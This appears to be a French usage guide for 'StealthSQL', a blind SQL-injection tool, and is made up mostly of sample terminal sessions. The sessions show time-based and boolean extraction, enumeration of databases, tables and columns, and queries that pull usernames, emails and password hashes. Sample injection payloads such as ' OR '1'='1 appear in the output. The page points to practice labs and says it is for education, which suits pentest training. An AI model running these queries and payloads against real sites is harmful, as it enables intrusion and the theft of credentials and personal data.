# Exemples d'utilisation de StealthSQL

## 🎯 Exemples pratiques

### Exemple 1 : Test basique avec Time-Based SQLi

```
$ python3 stealthsql.py

[?] Enter the target URL: http://vulnerable-site.com/product.php?id=
[?] Session cookie (press Enter to skip):
[?] Authentication token (press Enter to skip):
[?] Proxy (press Enter to skip):
[?] Custom headers, comma separated (press Enter to skip):
[✓] Auto-generated User-Agent: Mozilla/5.0 ...
[?] Use this User-Agent? (y/n, press Enter for yes): y
[?] SQLi type [T]ime-based / [B]oolean: T
[?] SQL query: SELECT username FROM users
[?] Enable verbose mode? (y/n): n
```

### Exemple 2 : Test avec Boolean-Based SQLi et cookie de session

```
$ python3 stealthsql.py

[?] Enter the target URL: http://test-site.com/user.php?id=
[?] Session cookie (press Enter to skip): PHPSESSID=abc123xyz789
[✓] Session cookie configured
[?] SQLi type [T]ime-based / [B]oolean: B
[?] SQL query: SELECT email FROM accounts
```

### Exemple 3 : Énumération de bases de données

```
[?] Enumerate databases/tables/columns? (databases/tables/columns/none): databases
[?] Enter name for enumeration (empty for databases):

Résultat :
[✓] Query output: information_schema
[✓] Query output: mysql
[✓] Query output: myapp_db
[✓] Query output: test_db
```

### Exemple 4 : Énumération de tables dans une base

```
[?] Enumerate databases/tables/columns? (databases/tables/columns/none): tables
[?] Enter name for enumeration (empty for databases): myapp_db

Résultat :
[✓] Query output: users
[✓] Query output: products
[✓] Query output: orders
[✓] Query output: sessions
```

### Exemple 5 : Énumération de colonnes d'une table

```
[?] Enumerate databases/tables/columns? (databases/tables/columns/none): columns
[?] Enter name for enumeration (empty for databases): users

Résultat :
[✓] Query output: id
[✓] Query output: username
[✓] Query output: password
[✓] Query output: email
[✓] Query output: created_at
```

### Exemple 6 : Utilisation avec proxy

```
[?] Enter the target URL: http://target.com/page.php?id=
[?] Proxy (press Enter to skip): http://127.0.0.1:8080
[✓] Proxy configured: http://127.0.0.1:8080
```

### Exemple 7 : Headers personnalisés

```
[?] Custom headers, comma separated (press Enter to skip): X-Forwarded-For: 127.0.0.1, X-Custom-Header: test
[✓] Custom headers configured
```

### Exemple 8 : Génération de rapport

```
[?] Generate report? (y/n): y
[?] Report format (html/json/csv): json
[✓] Report generated: sqli_report.json
```

## 📝 Requêtes SQL courantes

### Extraire des noms d'utilisateur
```sql
SELECT username FROM users
```

### Extraire des emails
```sql
SELECT email FROM users
```

### Extraire des mots de passe (hachés)
```sql
SELECT password FROM users
```

### Combiner plusieurs colonnes
```sql
SELECT CONCAT(username,':',password) FROM users
```

### Extraire avec une condition
```sql
SELECT username FROM users WHERE role='admin'
```

### Compter le nombre d'utilisateurs
```sql
SELECT COUNT(*) FROM users
```

## 🎨 Sortie typique

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ℹ] Detecting SQL injection vulnerabilities...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[→] Trying: Testing payload: ' OR '1'='1
[!] Potential SQL Injection found with payload: ' OR '1'='1
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ℹ] Using Time-Based Blind SQL Injection with 3s sleep time
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Total rows: 3

[✓] Query output: admin
[✓] Query output: user1
[✓] Query output: user2
[✓] All rows retrieved successfully!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[✓] Total time: 0:02:15
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## 🔍 Résumé final

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
═══════════════════════════════════════════════════════
                  RÉSUMÉ DE L'EXÉCUTION
═══════════════════════════════════════════════════════
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[1] Détection de vulnérabilité SQL Injection:
[✓] Vulnérabilité SQL Injection détectée!
    └─ Payloads réussis: 2
       • ' OR '1'='1
       • ' OR '1'='1' --

[2] Extraction de données:
[✓] Données extraites avec succès!
    └─ Nombre total d'entrées: 3

    Données récupérées:
       [1] admin
       [2] user1
       [3] user2

[3] Résultats de l'énumération:
[ℹ] Aucune énumération effectuée

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[4] Statut global:
    ✓ SUCCÈS - Le script a fonctionné et des données ont été extraites!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
═══════════════════════════════════════════════════════
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## ⚠️ Notes importantes

1. **Temps d'exécution** : Les attaques time-based peuvent prendre beaucoup de temps
2. **Détection** : Utilisez un délai approprié (3-5 secondes) pour éviter les faux positifs
3. **Proxies** : Utile pour tester via Burp Suite ou OWASP ZAP
4. **Headers** : Certaines applications nécessitent des headers spécifiques
5. **Cookies** : Essentiel pour tester des pages authentifiées

## 🧪 Environnements de test

Pour tester StealthSQL légalement, utilisez :
- [DVWA](http://www.dvwa.co.uk/) - Damn Vulnerable Web Application
- [bWAPP](http://www.itsecgames.com/) - buggy Web Application
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [Hack The Box](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)

---

**Rappel** : Ces exemples sont fournis à des fins éducatives uniquement ! 🎓
